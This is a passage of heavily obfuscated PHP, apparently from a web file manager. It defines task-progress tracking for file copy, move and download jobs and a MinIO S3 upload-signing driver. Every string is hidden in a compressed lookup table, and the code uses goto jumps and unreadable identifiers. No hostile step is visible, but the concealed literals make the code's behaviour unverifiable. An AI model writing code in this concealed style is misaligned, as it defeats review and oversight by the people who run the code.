$Êç¤¸‘Ñ[1681])); $this->startAfter(); Hook::trigger($Êç¤¸‘Ñ[1682], $this->task); $this->task[$Êç¤¸‘Ñ[1675]] = timeFloat(); } public function end($õ»¢Œöû = '') { $çûÃ·Š¤ =& $_SERVER[¹òÍ›æş]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$çûÃ·Š¤[1675]]) { self::valueSet($this->task[$çûÃ·Š¤[437]], !1); } $this->isEnd = !0; if ($õ»¢Œöû) { $this->task[$çûÃ·Š¤[491]] = $õ»¢Œöû; } self::log($çûÃ·Š¤[1683] . $this->task[$çûÃ·Š¤[437]] . $çûÃ·Š¤[1684] . sprintf($çûÃ·Š¤[880], timeFloat() - $this->task[$çûÃ·Š¤[1673]]) . $çûÃ·Š¤[1685]); Hook::unbind($çûÃ·Š¤[1633], array($this, $çûÃ·Š¤[1679])); Hook::unbind($çûÃ·Š¤[1680], array($this, $çûÃ·Š¤[1681])); $this->endAfter(); $æ ”¡»¦ = $this->task; $this->task = !1; Hook::trigger($çûÃ·Š¤[1686], $æ ”¡»¦); } public function update($Êù¾—ì = 0, $ä†ùªş€ = false) { $ˆš¼‹ºê =& $_SERVER[¹òÍ›æş]; $¿¼Şê˜‹ =& $this->task; if (!$¿¼Şê˜‹) { return; } $¿¼Şê˜‹[$ˆš¼‹ºê[1670]] += $Êù¾—ì; $¿¼Şê˜‹[$ˆš¼‹ºê[1674]] = timeFloat(); if ($¿¼Şê˜‹[$ˆš¼‹ºê[816]]) { if ($¿¼Şê˜‹[$ˆš¼‹ºê[816]] < $¿¼Şê˜‹[$ˆš¼‹ºê[1670]]) { $¿¼Şê˜‹[$ˆš¼‹ºê[816]] = $¿¼Şê˜‹[$ˆš¼‹ºê[1670]]; } $Óøëé˜± = timeFloat() - $¿¼Şê˜‹[$ˆš¼‹ºê[1673]] - $¿¼Şê˜‹[$ˆš¼‹ºê[1676]]; if ($Óøëé˜± <= 0) { $Óøëé˜± = 0.001; } $¿¼Şê˜‹[$ˆš¼‹ºê[1671]] = $¿¼Şê˜‹[$ˆš¼‹ºê[1670]] / $¿¼Şê˜‹[$ˆš¼‹ºê[816]]; $¿¼Şê˜‹[$ˆš¼‹ºê[1672]] = $¿¼Şê˜‹[$ˆš¼‹ºê[1670]] / $Óøëé˜±; if ($¿¼Şê˜‹[$ˆš¼‹ºê[1671]] > 0) { $¿¼Şê˜‹[$ˆš¼‹ºê[1677]] = $Óøëé˜± * (1 - $¿¼Şê˜‹[$ˆš¼‹ºê[1671]]) / $¿¼Şê˜‹[$ˆš¼‹ºê[1671]]; } $¿¼Şê˜‹[$ˆš¼‹ºê[1677]] = $¿¼Şê˜‹[$ˆš¼‹ºê[1677]] <= 0 ? 0 : $¿¼Şê˜‹[$ˆš¼‹ºê[1677]]; } $this->updateAfter(); $æŠÄôÑä = 0.2; if (timeFloat() - $¿¼Şê˜‹[$ˆš¼‹ºê[1675]] < $æŠÄôÑä && !$ä†ùªş€) { return; } $Ê˜Ç¹É• = self::get($¿¼Şê˜‹[$ˆš¼‹ºê[437]]); $ŒÊÏ = $Ê˜Ç¹É•[$ˆš¼‹ºê[780]]; if ($ŒÊÏ == self::STATYS_KILL) { $Æ÷ó¬ƒ“ = array($ˆš¼‹ºê[1687] => LNG($ˆš¼‹ºê[1688]), $ˆš¼‹ºê[1239] => !1); Cache::set($ˆš¼‹ºê[1689] . $this->task[$ˆš¼‹ºê[437]], $Æ÷ó¬ƒ“, 30); $this->onKill(); $this->end(); die; } else { if ($ŒÊÏ == self::STATYS_STOP) { $œ¥µÈô = 2; $Ê˜Ç¹É•[$ˆš¼‹ºê[1676]] += $œ¥µÈô; self::valueSet($¿¼Şê˜‹[$ˆš¼‹ºê[437]], $Ê˜Ç¹É•); sleep($œ¥µÈô); $this->update(); return; } } $¿¼Şê˜‹[$ˆš¼‹ºê[780]] = $ŒÊÏ ? $ŒÊÏ : $¿¼Şê˜‹[$ˆš¼‹ºê[780]]; $¿¼Şê˜‹[$ˆš¼‹ºê[1676]] = $Ê˜Ç¹É•[$ˆš¼‹ºê[1676]] ? $Ê˜Ç¹É•[$ˆš¼‹ºê[1676]] : 0; $¿¼Şê˜‹[$ˆš¼‹ºê[1675]] = timeFloat(); Hook::trigger($ˆš¼‹ºê[1690], $¿¼Şê˜‹); self::valueSet($¿¼Şê˜‹[$ˆš¼‹ºê[437]], $¿¼Şê˜‹); } public function onKillSet($³û¢ğ¨Ò, $¨èü¹÷ = array()) { $this->onKillCall = array($³û¢ğ¨Ò, $¨èü¹÷); } public function onKill() { $ë‘†ÚÃ÷ =& $_SERVER[¹òÍ›æş]; self::log($ë‘†ÚÃ÷[1683] . $this->task[$ë‘†ÚÃ÷[437]] . $ë‘†ÚÃ÷[1691]); Hook::trigger($ë‘†ÚÃ÷[1692], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¸‚²±À) { $˜–»øÇ† =& $_SERVER[¹òÍ›æş]; Cache::set($˜–»øÇ†[1689] . $this->task[$˜–»øÇ†[437]], $¸‚²±À, 60); return $¸‚²±À; } public static function get($—î×îõç) { $œ¨˜‚—È =& $_SERVER[¹òÍ›æş]; $œÆˆ›“¿ = self::valueGet($—î×îõç); if (is_array($œÆˆ›“¿) && $œÆˆ›“¿[$œ¨˜‚—È[1693]]) { $Ö€Ãáßù = ActionApply($œÆˆ›“¿[$œ¨˜‚—È[1693]], array($œÆˆ›“¿)); $œÆˆ›“¿ = is_array($Ö€Ãáßù) ? $Ö€Ãáßù : $œÆˆ›“¿; } return $œÆˆ›“¿; } public static function listData() { $˜ğ¯ú¢ = self::valueGet(); return array_sort_by($˜ğ¯ú¢, $_SERVER[¹òÍ›æş][1673], !0); } public static function kill($Š…¹Ş¼Û) { return self::changeStatus($Š…¹Ş¼Û, self::STATYS_KILL); } public static function stop($™Êéı×) { return self::changeStatus($™Êéı×, self::STATYS_STOP); } public static function restart($«¿Å¤–Â) { return self::changeStatus($«¿Å¤–Â, self::STATYS_RUNNING); } public static function killAll() { $ÍËëÇã =& $_SERVER[¹òÍ›æş]; $Ü™š«Ö = self::listData(); foreach ($Ü™š«Ö as $‰³£ôõ) { self::kill($‰³£ôõ[$ÍËëÇã[437]]); } sleep(2); foreach ($Ü™š«Ö as $‰³£ôõ) { self::valueSet($‰³£ôõ[$ÍËëÇã[437]], !1); } } private static function changeStatus($ˆîŠ×², $Š•…Ï«´) { $–¾µ“ó =& $_SERVER[¹òÍ›æş]; $ˆ‘ğÚï = self::valueGet($ˆîŠ×²); if (!$ˆ‘ğÚï) { return !1; } $ˆ‘ğÚï[$–¾µ“ó[780]] = $Š•…Ï«´; self::valueSet($ˆîŠ×², $ˆ‘ğÚï); self::log($–¾µ“ó[1694] . $ˆ‘ğÚï[$–¾µ“ó[437]] . $–¾µ“ó[1695] . $Š•…Ï«´); return !0; } public static function valueGet($î‡†ÅŸ÷ = false) { $ôæĞ€Èì =& $_SERVER[¹òÍ›æş]; if ($î‡†ÅŸ÷) { $È®ô¿İÀ = Model($ôæĞ€Èì[485])->where(array($ôæĞ€Èì[104] => $î‡†ÅŸ÷, $ôæĞ€Èì[33] => $ôæĞ€Èì[1098]))->find(); return $È®ô¿İÀ ? json_decode($È®ô¿İÀ[$ôæĞ€Èì[412]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ÓëÀ¤üâ = false) { $‡›µ›Ï =& $_SERVER[¹òÍ›æş]; $ı¼´™Ãî = array($‡›µ›Ï[33] => $‡›µ›Ï[1098]); if ($ÓëÀ¤üâ) { $ı¼´™Ãî[$‡›µ›Ï[1669]] = $ÓëÀ¤üâ; } $ó‘ïü = Model($‡›µ›Ï[485])->where($ı¼´™Ãî)->select(); $ó‘ïü = $ó‘ïü ? $ó‘ïü : array(); foreach ($ó‘ïü as $‘ŸŸÌú¼ => $Ö¬â˜) { $ó‘ïü[$‘ŸŸÌú¼] = json_decode($Ö¬â˜[$‡›µ›Ï[412]], !0); } return $ó‘ïü; } public static function valueSet($½åÀÇİĞ, $Á°¢Áç°) { $üçë¡şá =& $_SERVER[¹òÍ›æş]; if (!$Á°¢Áç°) { return Model($üçë¡şá[485])->where(array($üçë¡şá[104] => $½åÀÇİĞ, $üçë¡şá[33] => $üçë¡şá[1098]))->delete(); } $áÓ’«İ… = json_encode($Á°¢Áç°); if (!$áÓ’«İ…) { ob_start(); var_dump($Á°¢Áç°); $ü“é¸ = ob_get_clean(); self::log($üçë¡şá[1696] . json_encode_force($ü“é¸)); } if (!$½åÀÇİĞ || !$Á°¢Áç°[$üçë¡şá[437]]) { return !1; } $èëÖ¨¿› = array($üçë¡şá[33] => $üçë¡şá[1098], $üçë¡şá[1669] => USER_ID, $üçë¡şá[104] => $½åÀÇİĞ, $üçë¡şá[412] => $áÓ’«İ…); $Ë—±µè“ = $üçë¡şá[1697]; CacheLock::lock($Ë—±µè“); Model($üçë¡şá[485])->add($èëÖ¨¿›, array(), !0); CacheLock::unlock($Ë—±µè“); } public static function log($†‰¾öĞ®) { if (!GLOBAL_DEBUG) { return; } write_log($†‰¾öĞ®, $_SERVER[¹òÍ›æş][1698]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ÒıÃåµª =& $_SERVER[¹òÍ›æş]; $èç¥Ú  =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ÒıÃåµª[1699], array($this, $ÒıÃåµª[1700])); Hook::bind($ÒıÃåµª[1250], array($this, $ÒıÃåµª[1701])); Hook::bind($ÒıÃåµª[1702], array($this, $ÒıÃåµª[1703])); Hook::bind($ÒıÃåµª[634], array($this, $ÒıÃåµª[1704])); Hook::bind($ÒıÃåµª[635], array($this, $ÒıÃåµª[1705])); Hook::bind($ÒıÃåµª[640], array($this, $ÒıÃåµª[1706])); Hook::bind($ÒıÃåµª[641], array($this, $ÒıÃåµª[1707])); Hook::bind($ÒıÃåµª[637], array($this, $ÒıÃåµª[1708])); Hook::bind($ÒıÃåµª[638], array($this, $ÒıÃåµª[1709])); Hook::bind($ÒıÃåµª[603], array($this, $ÒıÃåµª[1710])); Hook::bind($ÒıÃåµª[600], array($this, $ÒıÃåµª[1710])); Hook::bind($ÒıÃåµª[605], array($this, $ÒıÃåµª[1710])); Hook::bind($ÒıÃåµª[607], array($this, $ÒıÃåµª[1710])); Hook::bind($ÒıÃåµª[609], array($this, $ÒıÃåµª[1710])); Hook::bind($ÒıÃåµª[1711], array($this, $ÒıÃåµª[1712])); Hook::bind($ÒıÃåµª[625], array($this, $ÒıÃåµª[1713])); $this->sourceModelCopyFlag = !1; Hook::bind($ÒıÃåµª[1714], array($this, $ÒıÃåµª[1715])); Hook::bind($ÒıÃåµª[1716], array($this, $ÒıÃåµª[1717])); Hook::bind($ÒıÃåµª[1718], array($this, $ÒıÃåµª[1719])); $èç¥Ú [$ÒıÃåµª[1720]] = LNG($ÒıÃåµª[1721]); $èç¥Ú [$ÒıÃåµª[1722]] = 0; $èç¥Ú [$ÒıÃåµª[1723]] = 0; $èç¥Ú [$ÒıÃåµª[1091]] = $ÒıÃåµª[12]; $èç¥Ú [$ÒıÃåµª[1724]] = $ÒıÃåµª[12]; $èç¥Ú [$ÒıÃåµª[1725]] = 0; $èç¥Ú [$ÒıÃåµª[1726]] = 0; $èç¥Ú [$ÒıÃåµª[1727]] = 0; if (!$èç¥Ú [$ÒıÃåµª[1569]]) { $èç¥Ú [$ÒıÃåµª[1569]] = LNG($ÒıÃåµª[1728]); } } protected function endAfter() { $İ°ø°¡ =& $_SERVER[¹òÍ›æş]; Hook::unbind($İ°ø°¡[1699], array($this, $İ°ø°¡[1700])); Hook::unbind($İ°ø°¡[1250], array($this, $İ°ø°¡[1701])); Hook::unbind($İ°ø°¡[1702], array($this, $İ°ø°¡[1703])); Hook::unbind($İ°ø°¡[634], array($this, $İ°ø°¡[1704])); Hook::unbind($İ°ø°¡[635], array($this, $İ°ø°¡[1705])); Hook::unbind($İ°ø°¡[640], array($this, $İ°ø°¡[1706])); Hook::unbind($İ°ø°¡[641], array($this, $İ°ø°¡[1707])); Hook::unbind($İ°ø°¡[637], array($this, $İ°ø°¡[1708])); Hook::unbind($İ°ø°¡[638], array($this, $İ°ø°¡[1709])); Hook::unbind($İ°ø°¡[603], array($this, $İ°ø°¡[1710])); Hook::unbind($İ°ø°¡[600], array($this, $İ°ø°¡[1710])); Hook::unbind($İ°ø°¡[605], array($this, $İ°ø°¡[1710])); Hook::unbind($İ°ø°¡[607], array($this, $İ°ø°¡[1710])); Hook::unbind($İ°ø°¡[609], array($this, $İ°ø°¡[1710])); Hook::unbind($İ°ø°¡[1711], array($this, $İ°ø°¡[1712])); Hook::unbind($İ°ø°¡[625], array($this, $İ°ø°¡[1713])); Hook::unbind($İ°ø°¡[1714], array($this, $İ°ø°¡[1715])); Hook::unbind($İ°ø°¡[1716], array($this, $İ°ø°¡[1717])); Hook::unbind($İ°ø°¡[1718], array($this, $İ°ø°¡[1719])); } public function copyMoveStart($ùÏÑÄàÛ, $‡®ÖÄÃ¼, $¹áÆ¯µ®, $ÀÅìµÊ) { $óµ»•¿ =& $_SERVER[¹òÍ›æş]; self::log($óµ»•¿[1729] . $‡®ÖÄÃ¼ . $óµ»•¿[80] . $ÀÅìµÊ); $‰€Ìï«À = rtrim(TEMP_FILES, $óµ»•¿[8]); if (substr($‡®ÖÄÃ¼, 0, strlen($‰€Ìï«À)) == $‰€Ìï«À) { return; } if (substr($ÀÅìµÊ, 0, strlen($‰€Ìï«À)) == $‰€Ìï«À) { return; } $ªÏÖ„õ =& $this->task; $ªÏÖ„õ[$óµ»•¿[1730]] = KodIO::transferType($ùÏÑÄàÛ, $¹áÆ¯µ®); $this->update(); } public function updateAfter() { $–Şöğ‹† =& $_SERVER[¹òÍ›æş]; $ğ½·¡áó =& $this->task; if (!$ğ½·¡áó[$–Şöğ‹†[793]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ğ½·¡áó[$–Şöğ‹†[1730]] == $–Şöğ‹†[1342]) { return; } self::updateTask($ğ½·¡áó); } private static function updateTask(&$öÀ¾¿ìÌ) { $ë€®Ø =& $_SERVER[¹òÍ›æş]; if ($öÀ¾¿ìÌ[$ë€®Ø[1730]] == $ë€®Ø[1221] || $öÀ¾¿ìÌ[$ë€®Ø[1730]] == $ë€®Ø[117]) { if ($öÀ¾¿ìÌ[$ë€®Ø[1724]]) { $öÀ¾¿ìÌ[$ë€®Ø[1727]] = $öÀ¾¿ìÌ[$ë€®Ø[1726]] + $öÀ¾¿ìÌ[$ë€®Ø[1723]]; } } else { if ($öÀ¾¿ìÌ[$ë€®Ø[1730]] == $ë€®Ø[1343]) { if ($öÀ¾¿ìÌ[$ë€®Ø[1724]] == $ë€®Ø[1221]) { $öÀ¾¿ìÌ[$ë€®Ø[1727]] = $öÀ¾¿ìÌ[$ë€®Ø[1726]] + $öÀ¾¿ìÌ[$ë€®Ø[1723]] * 0.5; } else { if ($öÀ¾¿ìÌ[$ë€®Ø[1724]] == $ë€®Ø[117]) { $öÀ¾¿ìÌ[$ë€®Ø[1727]] = $öÀ¾¿ìÌ[$ë€®Ø[1726]] + $öÀ¾¿ìÌ[$ë€®Ø[1722]] * 0.5 + $öÀ¾¿ìÌ[$ë€®Ø[1723]] * 0.5; } } } } $öÀ¾¿ìÌ[$ë€®Ø[1671]] = $öÀ¾¿ìÌ[$ë€®Ø[1727]] / $öÀ¾¿ìÌ[$ë€®Ø[793]]; if ($öÀ¾¿ìÌ[$ë€®Ø[1671]] > 0) { $ÎØÄéÄÚ = timeFloat() - $öÀ¾¿ìÌ[$ë€®Ø[1673]] - $öÀ¾¿ìÌ[$ë€®Ø[1676]]; $öÀ¾¿ìÌ[$ë€®Ø[1677]] = $ÎØÄéÄÚ * (1 - $öÀ¾¿ìÌ[$ë€®Ø[1671]]) / $öÀ¾¿ìÌ[$ë€®Ø[1671]]; } } public function addPath($ÇÇüŠ¿è) { $ÆïåîŸò =& $_SERVER[¹òÍ›æş]; if (!$ÇÇüŠ¿è) { return; } $ïØ ±À =& $this->task; $¬İùñ°Ì = IO::infoWithChildren($ÇÇüŠ¿è); $ı’ºÙ«¢ = $ïØ ±À[$ÆïåîŸò[1731]] ? $ïØ ±À[$ÆïåîŸò[1731]][$ÆïåîŸò[1732]] : 0; $ïØ ±À[$ÆïåîŸò[1731]] = array($ÆïåîŸò[1732] => $ı’ºÙ«¢ + 1, $ÆïåîŸò[458] => $¬İùñ°Ì[$ÆïåîŸò[32]], $ÆïåîŸò[94] => $¬İùñ°Ì[$ÆïåîŸò[94]], $ÆïåîŸò[547] => $¬İùñ°Ì[$ÆïåîŸò[547]] ? $¬İùñ°Ì[$ÆïåîŸò[547]] : $¬İùñ°Ì[$ÆïåîŸò[94]]); if ($¬İùñ°Ì[$ÆïåîŸò[33]] == $ÆïåîŸò[210]) { $ïØ ±À[$ÆïåîŸò[816]] += 1; } else { $ïØ ±À[$ÆïåîŸò[816]] += $¬İùñ°Ì[$ÆïåîŸò[89]][$ÆïåîŸò[87]]; if ($¬İùñ°Ì[$ÆïåîŸò[440]]) { $ïØ ±À[$ÆïåîŸò[816]] += $¬İùñ°Ì[$ÆïåîŸò[89]][$ÆïåîŸò[88]] + 1; } } $ïØ ±À[$ÆïåîŸò[793]] += $¬İùñ°Ì[$ÆïåîŸò[86]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($×ÀÜÅê×) { } public function sourceAddHashEnd($ßÄÏãäù) { } public function sourceAddFileStart($ïƒèŠ²) { $ıÉÖˆµ =& $_SERVER[¹òÍ›æş]; $€Âü±ã° =& $this->task; $€Âü±ã°[$ıÉÖˆµ[1722]] = $ïƒèŠ²[$ıÉÖˆµ[86]]; $€Âü±ã°[$ıÉÖˆµ[1720]] = $ïƒèŠ²[$ıÉÖˆµ[32]]; $€Âü±ã°[$ıÉÖˆµ[1091]] = $ïƒèŠ²[$ıÉÖˆµ[32]]; $€Âü±ã°[$ıÉÖˆµ[1733]] = $ïƒèŠ²[$ıÉÖˆµ[94]]; $this->update(); } public function sourceAddFileEnd($şÅâ¿Øƒ) { $—»á“° =& $_SERVER[¹òÍ›æş]; $ÊšíÂ·Ğ =& $this->task; $ÊšíÂ·Ğ[$—»á“°[1727]] += $şÅâ¿Øƒ[$—»á“°[86]]; $ÊšíÂ·Ğ[$—»á“°[1733]] = $şÅâ¿Øƒ[$—»á“°[94]]; $this->update(1); } public function copyFileStart($ìıÆÚñş, $ï Ù­¥¾, $ï÷ãœğ•, $ë²ìÂé‡, $ü—¸×¬, $úß¬ öà) { $ÙòŸ÷½ =& $_SERVER[¹òÍ›æş]; $ÖÀ¸üô = $ü—¸×¬; if ($ÖÀ¸üô == $GLOBALS[$ÙòŸ÷½[1734]]) { $ÖÀ¸üô = $GLOBALS[$ÙòŸ÷½[1735]]; } $GLOBALS[$ÙòŸ÷½[1735]] = $ü—¸×¬; $GLOBALS[$ÙòŸ÷½[1734]] = $úß¬ öà; $‡Œ×šúç =& $this->task; $‡Œ×šúç[$ÙòŸ÷½[1720]] = $ÖÀ¸üô; $‡Œ×šúç[$ÙòŸ÷½[1722]] = (int) $ìıÆÚñş->size($ï Ù­¥¾); $‡Œ×šúç[$ÙòŸ÷½[1723]] = 0; $‡Œ×šúç[$ÙòŸ÷½[1091]] = $ÙòŸ÷½[12]; $‡Œ×šúç[$ÙòŸ÷½[1724]] = $ÙòŸ÷½[12]; $‡Œ×šúç[$ÙòŸ÷½[1725]] = 0; $âïïšÀ = $‡Œ×šúç[$ÙòŸ÷½[1722]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($‡Œ×šúç[$ÙòŸ÷½[437]] . $ÙòŸ÷½[1736]); if ($âïïšÀ && file_exists(get_path_father($ë²ìÂé‡))) { Cache::set($‡Œ×šúç[$ÙòŸ÷½[437]] . $ÙòŸ÷½[1736], $ë²ìÂé‡); $‡Œ×šúç[$ÙòŸ÷½[1693]] = array($ÙòŸ÷½[1737], $ÙòŸ÷½[1738]); } $this->update(0, $âïïšÀ); } public static function updateCopyLocalFileSize($Ò™ƒ¦) { $ñÆí•¿ =& $_SERVER[¹òÍ›æş]; $È³§“„œ = Cache::get($Ò™ƒ¦[$ñÆí•¿[437]] . $ñÆí•¿[1736]); if (!$È³§“„œ || !file_exists($È³§“„œ)) { return $Ò™ƒ¦; } $Ò™ƒ¦[$ñÆí•¿[1723]] = @filesize($È³§“„œ); $Ò™ƒ¦[$ñÆí•¿[1727]] += $Ò™ƒ¦[$ñÆí•¿[1723]]; self::updateTask($Ò™ƒ¦); return $Ò™ƒ¦; } public function copyFileEnd($¢ìŒ»‰·, $ÄÅë¹‹æ, $ ÇÚ²¤», $´¢ç˜ı, $öä—âÄ÷, $ÛçÑ×Õ) { $·®ğ³£Ç =& $_SERVER[¹òÍ›æş]; $ ÁíÅÉ =& $this->task; $ ÁíÅÉ[$·®ğ³£Ç[1723]] = $ ÁíÅÉ[$·®ğ³£Ç[1722]]; $ ÁíÅÉ[$·®ğ³£Ç[1724]] = $·®ğ³£Ç[12]; unset($ ÁíÅÉ[$·®ğ³£Ç[1693]]); if ($öä—âÄ÷ == $ ÁíÅÉ[$·®ğ³£Ç[1720]]) { $ ÁíÅÉ[$·®ğ³£Ç[1726]] += $ ÁíÅÉ[$·®ğ³£Ç[1722]]; $ ÁíÅÉ[$·®ğ³£Ç[1727]] = $ ÁíÅÉ[$·®ğ³£Ç[1726]]; $ôéÓ½ = 1; if (isset($ ÁíÅÉ[$·®ğ³£Ç[1733]]) && $ ÁíÅÉ[$·®ğ³£Ç[1733]] == $ÄÅë¹‹æ) { $ôéÓ½ = 0; } $this->update($ôéÓ½); } else { $this->update(); $ ÁíÅÉ[$·®ğ³£Ç[1723]] = 0; } Cache::remove($ ÁíÅÉ[$·®ğ³£Ç[437]] . $·®ğ³£Ç[1736]); self::log($·®ğ³£Ç[1739] . $ÄÅë¹‹æ . $·®ğ³£Ç[80] . $´¢ç˜ı . $·®ğ³£Ç[59] . $öä—âÄ÷ . $·®ğ³£Ç[1740] . $ ÁíÅÉ[$·®ğ³£Ç[1720]]); } public function updateFileEnd($Ì´“°È¼, $èÓÀ•…à) { $ËÅÎÍìÕ =& $_SERVER[¹òÍ›æş]; $®‚ñ÷¿÷ =& $this->task; $®‚ñ÷¿÷[$ËÅÎÍìÕ[1720]] = $Ì´“°È¼; $®‚ñ÷¿÷[$ËÅÎÍìÕ[1722]] = $èÓÀ•…à; $®‚ñ÷¿÷[$ËÅÎÍìÕ[1726]] += $èÓÀ•…à; $®‚ñ÷¿÷[$ËÅÎÍìÕ[1727]] = $®‚ñ÷¿÷[$ËÅÎÍìÕ[1726]]; $this->update(1); self::log($ËÅÎÍìÕ[1741] . $Ì´“°È¼); } public function sourceModelCopy($Ë•µìŒ½) { $Àó¯öè =& $_SERVER[¹òÍ›æş]; $Ü®¹Şô… = $Ë•µìŒ½[0]; $‚¸Ä¨©Ì = $Ë•µìŒ½[1]; $‹°÷»Ô³ =& $this->task; $this->sourceModelCopyFlag = !0; $ş•×ì  = 0; switch ($Ü®¹Şô…) { case $Àó¯öè[601]: $ş•×ì  = 1; break; case $Àó¯öè[604]: $‹°÷»Ô³[$Àó¯öè[1720]] = $‚¸Ä¨©Ì[$Àó¯öè[32]]; break; case $Àó¯öè[606]: $ş•×ì  = intval($Ë•µìŒ½[$Àó¯öè[418]] * 0.4); break; case $Àó¯öè[608]: $ş•×ì  = intval($Ë•µìŒ½[$Àó¯öè[418]] * 0.2); break; case $Àó¯öè[610]: $ş•×ì  = intval($Ë•µìŒ½[$Àó¯öè[418]] * 0.4); break; } $this->update($ş•×ì ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Æ®¾’Ñ, $å¨úÀÓÂ) { $ŒŞ¶¹É‘ =& $_SERVER[¹òÍ›æş]; $this->sourceModelCopyFlag = !0; $ûÆ‘‘ä™ = 1; if (isset($Æ®¾’Ñ[$ŒŞ¶¹É‘[89]])) { $ûÆ‘‘ä™ = $Æ®¾’Ñ[$ŒŞ¶¹É‘[89]][$ŒŞ¶¹É‘[87]]; $ûÆ‘‘ä™ = $ûÆ‘‘ä™ + $Æ®¾’Ñ[$ŒŞ¶¹É‘[89]][$ŒŞ¶¹É‘[88]] + 1; } $this->update($ûÆ‘‘ä™); $this->sourceModelCopyFlag = !1; } public function sourceMove($øõÛ¨¼) { $this->sourceRemove($øõÛ¨¼, !1); } public function curlProgress($±²é™¿ú, $ÅÙŠ×ô¯, $òëëŒœÂ, $ŸºØË¶—, $Š§öç) { $ÆÌÆü¦£ =& $_SERVER[¹òÍ›æş]; $»šì®ûä =& $this->task; if ($Š§öç > 0) { $»šì®ûä[$ÆÌÆü¦£[1091]] = $ÆÌÆü¦£[1742]; $»šì®ûä[$ÆÌÆü¦£[1724]] = $ÆÌÆü¦£[117]; if ($»šì®ûä[$ÆÌÆü¦£[1722]]) { $»šì®ûä[$ÆÌÆü¦£[1723]] = $Š§öç; } if ($»šì®ûä[$ÆÌÆü¦£[1725]]) { $»šì®ûä[$ÆÌÆü¦£[1723]] = $Š§öç + $»šì®ûä[$ÆÌÆü¦£[1725]]; } } else { if ($òëëŒœÂ > 0) { if ($»šì®ûä[$ÆÌÆü¦£[1722]] == $ÅÙŠ×ô¯) { $»šì®ûä[$ÆÌÆü¦£[1723]] = $òëëŒœÂ; $»šì®ûä[$ÆÌÆü¦£[1091]] = $ÆÌÆü¦£[1743]; $»šì®ûä[$ÆÌÆü¦£[1724]] = $ÆÌÆü¦£[1221]; } } } $this->update(); } public function curlProgressStart($Ğ”¾¥©É) { } public function curlProgressEnd($²”á½) { $ÊÈ­å¬ü =& $_SERVER[¹òÍ›æş]; $·éÍ²¤’ =& $this->task; $†Ö•è¥ƒ = curl_getinfo($²”á½); $–á¾ìæ¿ = $†Ö•è¥ƒ[$ÊÈ­å¬ü[1744]]; if ($–á¾ìæ¿ == -1) { $–á¾ìæ¿ = $†Ö•è¥ƒ[$ÊÈ­å¬ü[1745]]; } if ($·éÍ²¤’[$ÊÈ­å¬ü[1724]] == $ÊÈ­å¬ü[117] && $–á¾ìæ¿) { $·éÍ²¤’[$ÊÈ­å¬ü[1725]] += $–á¾ìæ¿; } $this->update(); } } goto Cƒ¢Ë¶´·Ö; EÀŸ– ‰Ğ×: define($_SERVER[¹òÍ›æş][0], $_SERVER[¹òÍ›æş][1]); $_SERVER[øëœ¾ŞŠ] = explode($_SERVER[¹òÍ›æş][2], gzinflate(substr($_SERVER[¹òÍ›æş][3], 10, -8))); function binCheckEq($§ñÛÃ¡“, $«“ÖÏ) { return $§ñÛÃ¡“ == $«“ÖÏ; } goto aˆ¤ÚÓ¤÷‚; C‡Â¹Õ›¹Š: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ğòø–«›) { parent::__construct($ğòø–«›); $this->signatureVersion($_SERVER[¹òÍ›æş][226]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($‚óëäş, $Óó¨Šöá = 3600) { $€àŸÌÜˆ =& $_SERVER[¹òÍ›æş]; $ß®Õğ¼ = $€àŸÌÜˆ[209]; $„•İ¾Ô = $€àŸÌÜˆ[247]; $½Ê±Ÿˆ = $€àŸÌÜˆ[72]; $‘¶±ƒÀ = gmdate($€àŸÌÜˆ[248]); $ÚıÛí = gmdate($€àŸÌÜˆ[249]); $¼‚üšø = $€àŸÌÜˆ[250]; $İİúÓßš = $Óó¨Šöá . $€àŸÌÜˆ[12]; $³±Ò‘½ = $€àŸÌÜˆ[251]; $ïıèş•ü = array($this->accessKey, $ÚıÛí, $this->region, $½Ê±Ÿˆ, $¼‚üšø); $ƒ¼ì·Ó® = implode($€àŸÌÜˆ[8], $ïıèş•ü); $î––¹„ = array($€àŸÌÜˆ[252] => gmdate($€àŸÌÜˆ[253], strtotime($€àŸÌÜˆ[254])), $€àŸÌÜˆ[255] => array(array($€àŸÌÜˆ[256] => $this->bucket), array($€àŸÌÜˆ[257] => $ß®Õğ¼), array($€àŸÌÜˆ[258], $€àŸÌÜˆ[259], $€àŸÌÜˆ[12]), array($€àŸÌÜˆ[258], $€àŸÌÜˆ[260], $€àŸÌÜˆ[12]), array($€àŸÌÜˆ[258], $€àŸÌÜˆ[261], $€àŸÌÜˆ[12]), array($€àŸÌÜˆ[262] => $³±Ò‘½), array($€àŸÌÜˆ[263] => $ƒ¼ì·Ó®), array($€àŸÌÜˆ[264] => $„•İ¾Ô), array($€àŸÌÜˆ[265] => $‘¶±ƒÀ), array($€àŸÌÜˆ[266] => $İİúÓßš))); $™©ûö‰ô = base64_encode(json_encode($î––¹„)); $úç£ø¿Õ = hash_hmac($€àŸÌÜˆ[267], $ÚıÛí, $€àŸÌÜˆ[268] . $this->secret, !0); $³ù•óÈÀ = hash_hmac($€àŸÌÜˆ[267], $this->region, $úç£ø¿Õ, !0); $Óãö—º» = hash_hmac($€àŸÌÜˆ[267], $½Ê±Ÿˆ, $³ù•óÈÀ, !0); $æ“ˆòŠ¸ = hash_hmac($€àŸÌÜˆ[267], $¼‚üšø, $Óãö—º», !0); $•ä«’” = hash_hmac($€àŸÌÜˆ[267], $™©ûö‰ô, $æ“ˆòŠ¸); $ÇßóÇÎ¤ = array($€àŸÌÜˆ[225] => $€àŸÌÜˆ[12], $€àŸÌÜˆ[269] => $€àŸÌÜˆ[12], $€àŸÌÜˆ[257] => $ß®Õğ¼, 